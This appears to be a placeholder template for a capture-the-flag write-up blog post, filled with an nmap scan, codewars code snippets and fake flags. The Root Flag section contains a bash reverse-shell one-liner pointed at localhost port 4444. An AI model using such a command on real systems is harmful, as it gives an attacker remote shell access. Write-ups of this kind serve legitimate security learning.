I"<p><em>Everything below is just random stuff for the sake of example.</em></p>

<h1 id="information-gathering">Information Gathering</h1>

<h2 id="nmap">Nmap</h2>
<p>We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">x@wartop:~$</span><span class="w"> </span>nmap <span class="nt">-sVC</span> 192.168.100.6
<span class="go">
Starting Nmap 7.01 ( https://nmap.org ) at 2019-08-11 08:57 PDT
Nmap scan report for 192.168.100.6 (192.168.100.1)
Host is up (0.022s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
53/tcp  open  domain
81/tcp  open  http     Apache httpd
|_http-server-header: Apache
444/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=192.168.100.6
| Not valid before: 2018-07-06T14:40:08
|_Not valid after:  4756-06-01T14:40:08

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.22 seconds
</span></code></pre></div></div>
<p>From the above output we can see that ports, <strong>22</strong>, <strong>53</strong>, <strong>81</strong>, and <strong>444</strong> are the ports open. This is just an example to show code formatting so who cares.</p>

<p>Look  hereâ€™s an image of my website, this is how you format an image.</p>

<p><img src="/wp-content/uploads/2019/08/template/images/ryankozak.com.png" alt="My Website" />
<strong>Figure 1:</strong> My Website</p>

<p><img src="/wp-content/uploads/2019/08/template/images/github.png" alt="Github" />
<strong>Figure 2:</strong> Github Profile</p>

<p>Maybe we want to show some python code too, to letâ€™s take a look at a snipped from <a href="https://www.codewars.com">codewars</a> to format time as human readable.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">make_readable</span><span class="p">(</span><span class="n">seconds</span><span class="p">):</span>        

    <span class="n">hours</span> <span class="o">=</span> <span class="n">seconds</span> <span class="o">/</span> <span class="mi">60</span><span class="o">**</span><span class="mi">2</span>
    <span class="n">minutes</span> <span class="o">=</span> <span class="n">seconds</span><span class="o">/</span><span class="mi">60</span> <span class="o">-</span> <span class="n">hours</span><span class="o">*</span><span class="mi">60</span>
    <span class="n">seconds</span> <span class="o">=</span> <span class="n">seconds</span> <span class="o">-</span> <span class="n">hours</span><span class="o">*</span><span class="p">(</span><span class="mi">60</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="n">minutes</span><span class="o">*</span><span class="mi">60</span>

    <span class="k">return</span> <span class="s">'%02d:%02d:%02d'</span> <span class="o">%</span> <span class="p">(</span><span class="n">hours</span><span class="p">,</span> <span class="n">minutes</span><span class="p">,</span> <span class="n">seconds</span><span class="p">)</span>
</code></pre></div></div>

<h1 id="exploitation">Exploitation</h1>

<p>In order to gain our initial foothold we need to blablablabla. Hereâ€™s another code snippet just for fun.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">sqInRect</span><span class="p">(</span><span class="nv">$lng</span><span class="p">,</span> <span class="nv">$wdth</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">if</span><span class="p">(</span><span class="nv">$lng</span> <span class="o">==</span> <span class="nv">$wdth</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nv">$squares</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>

    <span class="k">while</span><span class="p">(</span><span class="nv">$lng</span><span class="o">*</span><span class="nv">$wdth</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span><span class="p">(</span><span class="nv">$lng</span><span class="o">&gt;</span><span class="nv">$wdth</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$base</span> <span class="o">=</span> <span class="nv">$wdth</span><span class="p">;</span>
        <span class="nv">$lng</span> <span class="o">=</span> <span class="nv">$lng</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$base</span> <span class="o">=</span> <span class="nv">$lng</span><span class="p">;</span>
        <span class="nv">$wdth</span> <span class="o">=</span> <span class="nv">$wdth</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="nb">array_push</span><span class="p">(</span><span class="nv">$squares</span><span class="p">,</span> <span class="nv">$base</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$squares</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Above is the php code for the <strong>Rectangle into Squares</strong> kata solution from codewars.</p>

<h2 id="user-flag">User Flag</h2>

<p>In order to get the user flag, we simply need to use <code class="language-plaintext highlighter-rouge">cat</code>, because this is a template and not a real writeup!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
</code></pre></div></div>

<h2 id="root-flag">Root Flag</h2>

<p>The privilege escalation for this box was not hard, because this is an example and Iâ€™ve got sudo password. Hereâ€™s some code to call a reverse shell <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</code>.</p>

<p><img src="/wp-content/uploads/2019/08/template/images/root.png" alt="Root" />
<strong>Figure 3:</strong> root.txt v5gw5zkh8rr3vmye7p4ka</p>

<h1 id="conclusion">Conclusion</h1>
<p>In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.</p>

<h1 id="references">References</h1>
<ol>
  <li><a href="https://github.com/Wandmalfarbe/pandoc-latex-template">https://github.com/Wandmalfarbe/pandoc-latex-template</a></li>
  <li><a href="https://github.com/d0n601/HTB_Writeup-Template/">https://github.com/d0n601/HTB_Writeup-Template/</a></li>
</ol>
:ET